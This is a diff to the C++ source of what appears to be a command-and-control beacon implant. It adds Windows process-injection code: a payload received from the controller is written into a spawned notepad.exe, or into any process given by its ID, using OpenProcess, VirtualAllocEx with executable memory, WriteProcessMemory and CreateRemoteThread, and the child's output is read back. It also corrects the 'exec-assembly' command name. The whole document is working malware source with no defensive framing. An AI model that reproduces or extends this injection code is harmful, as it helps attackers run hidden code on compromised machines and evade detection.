@@ -10,6 +10,7 @@
 // windows code goes here
 #endif
 
+#define BUFSIZE 4096 
 
 using namespace std;
 
@@ -24,6 +25,95 @@ void execAsembly(const std::string& payload)
 	((int (*)()) exec)();
 
 #elif _WIN32
+
+	std::cout << "exec-assembly size payload " << payload.size() << std::endl;
+
+	HANDLE g_hChildStd_IN_Rd = NULL;
+	HANDLE g_hChildStd_IN_Wr = NULL;
+	HANDLE g_hChildStd_OUT_Rd = NULL;
+	HANDLE g_hChildStd_OUT_Wr = NULL;
+
+	SECURITY_ATTRIBUTES saAttr;
+	saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
+	saAttr.bInheritHandle = TRUE;
+	saAttr.lpSecurityDescriptor = NULL;
+
+	CreatePipe(&g_hChildStd_OUT_Rd, &g_hChildStd_OUT_Wr, &saAttr, 0);
+	SetHandleInformation(g_hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0);
+	CreatePipe(&g_hChildStd_IN_Rd, &g_hChildStd_IN_Wr, &saAttr, 0);
+	SetHandleInformation(g_hChildStd_IN_Wr, HANDLE_FLAG_INHERIT, 0);
+
+	TCHAR szCmdline[] = TEXT("notepad.exe");
+	PROCESS_INFORMATION piProcInfo;
+	STARTUPINFO siStartInfo;
+	BOOL bSuccess = FALSE;
+
+	ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));
+	ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));
+	siStartInfo.cb = sizeof(STARTUPINFO);
+	siStartInfo.hStdError = g_hChildStd_OUT_Wr;
+	siStartInfo.hStdOutput = g_hChildStd_OUT_Wr;
+	siStartInfo.hStdInput = g_hChildStd_IN_Rd;
+	siStartInfo.dwFlags |= STARTF_USESTDHANDLES;
+
+	bSuccess = CreateProcess(NULL,
+		szCmdline,     // command line 
+		NULL,          // process security attributes 
+		NULL,          // primary thread security attributes 
+		TRUE,          // handles are inherited 
+		0,             // creation flags 
+		NULL,          // use parent's environment 
+		NULL,          // use parent's current directory 
+		&siStartInfo,  // STARTUPINFO pointer 
+		&piProcInfo);  // receives PROCESS_INFORMATION 
+
+	std::cout << "Injection " << piProcInfo.dwProcessId << std::endl;
+
+	int pid = piProcInfo.dwProcessId;
+
+	HANDLE processHandle;
+	HANDLE remoteThread;
+	PVOID remoteBuffer;
+
+	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(pid));
+	remoteBuffer = VirtualAllocEx(processHandle, NULL, payload.size(), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+	WriteProcessMemory(processHandle, remoteBuffer, payload.data(), payload.size(), NULL);
+	remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
+	CloseHandle(processHandle);
+
+	if (!bSuccess)
+		std::cout << "CreateProcess" << std::endl;
+	else
+	{
+		CloseHandle(piProcInfo.hProcess);
+		CloseHandle(piProcInfo.hThread);
+		CloseHandle(g_hChildStd_OUT_Wr);
+		CloseHandle(g_hChildStd_IN_Rd);
+	}
+
+	std::cout << "\n->Contents of child process STDOUT:\n\n" << std::endl;
+
+	DWORD dwRead, dwWritten;
+	CHAR chBuf[BUFSIZE];
+	bSuccess = FALSE;
+	HANDLE hParentStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
+	HANDLE hParentStdIn = GetStdHandle(STD_INPUT_HANDLE);
+
+	while (1)
+	{
+		bSuccess = ReadFile(g_hChildStd_OUT_Rd, chBuf, BUFSIZE, &dwRead, NULL);
+		if (!bSuccess || dwRead == 0) break;
+
+		bSuccess = WriteFile(hParentStdOut, chBuf, dwRead, &dwWritten, NULL);
+		if (!bSuccess) break;
+
+		// how to get interactive ???
+		//bSuccess = ReadFile(hParentStdIn, chBuf, BUFSIZE, &dwRead, NULL);
+		//if (!bSuccess || dwRead == 0) break;
+
+		//bSuccess = WriteFile(g_hChildStd_IN_Rd, chBuf, BUFSIZE, &dwRead, NULL);
+		//if (!bSuccess || dwRead == 0) break;
+	}
 
 #endif
 
@@ -72,6 +162,18 @@ int inject(int pid, const std::string& payload)
 	regs.rip += 2;
 
 #elif _WIN32
+
+	HANDLE processHandle;
+	HANDLE remoteThread;
+	PVOID remoteBuffer;
+
+	std::cout << "Injection " << pid << std::endl;
+
+	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(pid));
+	remoteBuffer = VirtualAllocEx(processHandle, NULL, payload.size(), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+	WriteProcessMemory(processHandle, remoteBuffer, payload.data(), payload.size(), NULL);
+	remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
+	CloseHandle(processHandle);
 
 #endif
 
@@ -144,7 +246,7 @@ bool Beacon::execInstruction(C2Message& c2Message, C2Message& c2RetMessage)
 		output << buffer;
 		output.close();
 	}
-	else if (instruction == "exec-asembly")
+	else if (instruction == "exec-assembly")
 	{
 		const std::string buffer = c2Message.data();
 
